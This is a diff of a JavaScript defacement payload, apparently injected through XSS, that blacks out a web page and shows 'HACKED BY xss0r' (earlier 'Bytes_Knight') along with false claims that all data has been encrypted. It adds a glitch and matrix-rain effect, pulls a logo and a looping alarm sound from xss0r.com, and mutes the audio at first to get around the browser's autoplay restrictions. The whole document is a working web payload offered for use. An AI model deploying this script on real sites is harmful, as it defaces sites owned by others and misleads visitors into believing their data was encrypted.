@@ -1,23 +1,17 @@
 (function() {
-    // Create a semi-transparent black overlay
+    // Create a full-screen black overlay
     var overlay = document.createElement('div');
     overlay.style.position = 'fixed';
     overlay.style.top = '0';
     overlay.style.left = '0';
     overlay.style.width = '100%';
     overlay.style.height = '100%';
-    overlay.style.backgroundColor = '#000000';
-    overlay.style.zIndex = '9997';
-    overlay.style.opacity = '0.8'; // Semi-transparent to show matrix effect
+    overlay.style.backgroundColor = '#000000';  // Black background
+    overlay.style.zIndex = 9998;  // Below the text but above everything else
+    overlay.style.opacity = '1';  // Fully visible
     document.body.appendChild(overlay);
 
-    // Create matrix container for binary rain effect
-    var matrixContainer = document.createElement('div');
-    matrixContainer.className = 'matrix';
-    matrixContainer.style.zIndex = '9998'; // Above overlay, below message
-    document.body.appendChild(matrixContainer);
-
-    // Create container for logo and message
+    // Create a container for the logo and hacking message
     var container = document.createElement('div');
     container.style.position = 'fixed';
     container.style.top = '0';
@@ -28,107 +22,123 @@
     container.style.flexDirection = 'column';
     container.style.alignItems = 'center';
     container.style.justifyContent = 'center';
-    container.style.zIndex = '9999'; // Topmost layer
+    container.style.zIndex = 9999;  // Above the overlay
     document.body.appendChild(container);
 
-    // Add logo (replace with your own URL if desired)
+    // Add your logo
     var logo = document.createElement('img');
-    logo.src = 'https://xss0r.com/resources/logo-v3.jpg'; // Placeholder logo
-    logo.style.width = '150px';
-    logo.style.marginBottom = '20px';
+    logo.src = 'https://xss0r.com/resources/logo-v3.jpg';  // Your logo URL
+    logo.style.width = '150px';  // Adjust size as needed
+    logo.style.marginBottom = '20px';  // Space between logo and text
     container.appendChild(logo);
 
-    // Add hacking message with neon cyan text
+    // Create a hacking note message
     var message = document.createElement('div');
     message.innerHTML = `
-        <h1 style="color: #00FFFF; font-family: monospace; text-align: center; font-size: 3em;">
-            HACKED BY Bytes_Knight
+        <h1 style="color: #00FF00; font-family: 'Courier New', monospace; text-align: center; font-size: 3em;">
+            HACKED BY xss0r
         </h1>
-        <p style="color: #00FFFF; font-family: monospace; text-align: center; font-size: 1.5em;">
-            Security breach detected. Immediate action required.
+        <p style="color: #00FF00; font-family: 'Courier New', monospace; text-align: center; font-size: 1.5em;">
+            Your security has been compromised. Contact Admin immediately.
         </p>
-        <p style="color: #00FFFF; font-family: monospace; text-align: center; font-size: 1.2em;">
-            All systems compromised. Data encryption in progress.
+        <p style="color: #00FF00; font-family: 'Courier New', monospace; text-align: center; font-size: 1.2em;">
+            System integrity compromised. All data has been encrypted.
         </p>
     `;
     container.appendChild(message);
 
-    // Add styles for glow and shake effects
-    var style = document.createElement('style');
-    style.type = 'text/css';
-    style.appendChild(document.createTextNode(`
-        @keyframes glow {
-            0% { text-shadow: 0 0 10px #00FFFF; }
-            50% { text-shadow: 0 0 20px #00FFFF, 0 0 30px #00FFFF; }
-            100% { text-shadow: 0 0 10px #00FFFF; }
-        }
-        @keyframes shake {
-            0% { transform: translate(0, 0); }
-            10% { transform: translate(-2px, 2px); }
-            20% { transform: translate(2px, -2px); }
-            30% { transform: translate(-2px, 2px); }
-            40% { transform: translate(2px, -2px); }
-            50% { transform: translate(0, 0); }
-            100% { transform: translate(0, 0); }
+    // Add a blinking effect to the message
+    var blinkStyle = document.createElement('style');
+    blinkStyle.type = 'text/css';
+    blinkStyle.appendChild(document.createTextNode(`
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
         }
         h1, p {
-            animation: glow 2s infinite;
-        }
-        h1 {
-            animation: glow 2s infinite, shake 5s infinite;
+            animation: blink 1s infinite;
         }
     `));
-    document.head.appendChild(style);
+    document.head.appendChild(blinkStyle);
 
-    // Add styles for matrix binary rain
+    // Add a glitch effect to the message
+    var glitchStyle = document.createElement('style');
+    glitchStyle.type = 'text/css';
+    glitchStyle.appendChild(document.createTextNode(`
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        h1 {
+            animation: glitch 0.5s infinite;
+        }
+    `));
+    document.head.appendChild(glitchStyle);
+
+    // Add a matrix-style green code rain effect
     var matrixStyle = document.createElement('style');
     matrixStyle.type = 'text/css';
     matrixStyle.appendChild(document.createTextNode(`
+        @keyframes matrix {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100%); }
+        }
         .matrix {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            z-index: 9998;
+            background: linear-gradient(transparent 90%, #000000 100%);
+            z-index: 9997;
             pointer-events: none;
             overflow: hidden;
         }
         .matrix span {
             position: absolute;
-            color: #00FFFF;
-            font-family: monospace;
+            color: #00FF00;
+            font-family: 'Courier New', monospace;
             font-size: 1.2em;
-            animation-name: fall;
-            animation-timing-function: linear;
-            animation-iteration-count: infinite;
-        }
-        @keyframes fall {
-            0% { top: -50px; }
-            100% { top: 100%; }
+            animation: matrix 5s linear infinite;
         }
     `));
     document.head.appendChild(matrixStyle);
 
-    // Function to create binary rain effect
+    // Create matrix code rain
+    var matrixContainer = document.createElement('div');
+    matrixContainer.className = 'matrix';
+    document.body.appendChild(matrixContainer);
+
     function createMatrixCode() {
         var span = document.createElement('span');
-        span.textContent = Math.random() < 0.5 ? '0' : '1'; // Binary digits
+        span.textContent = String.fromCharCode(Math.floor(Math.random() * 94) + 33);  // Random ASCII character
         span.style.left = Math.random() * window.innerWidth + 'px';
-        span.style.animationDuration = (Math.random() * 3 + 2) + 's'; // Random fall speed
+        span.style.animationDuration = Math.random() * 3 + 2 + 's';  // Random speed
         matrixContainer.appendChild(span);
-        setTimeout(() => span.remove(), 7000); // Remove after 7 seconds
-    }
-    setInterval(createMatrixCode, 100); // Spawn new binary digits every 100ms
 
-    // Play warning sound (replace URL with your own if desired)
+        // Remove span after animation ends
+        setTimeout(() => span.remove(), 7000);
+    }
+
+    // Spawn matrix code every 100ms
+    setInterval(createMatrixCode, 100);
+
+    // Add a warning sound with autoplay
     var audio = new Audio('https://xss0r.com/Resources/warning.mp3');
     audio.loop = true;
-    audio.muted = true; // Start muted to bypass autoplay restrictions
+
+    // Mute initially to allow autoplay, then unmute after a short delay
+    audio.muted = true;
     audio.play().then(() => {
+        // Unmute after the audio starts playing
         setTimeout(() => {
-            audio.muted = false; // Unmute after 1 second
-        }, 1000);
+            audio.muted = false;
+        }, 1000);  // 1-second delay to ensure autoplay works
     }).catch((error) => {
         console.error('Audio autoplay failed:', error);
     });
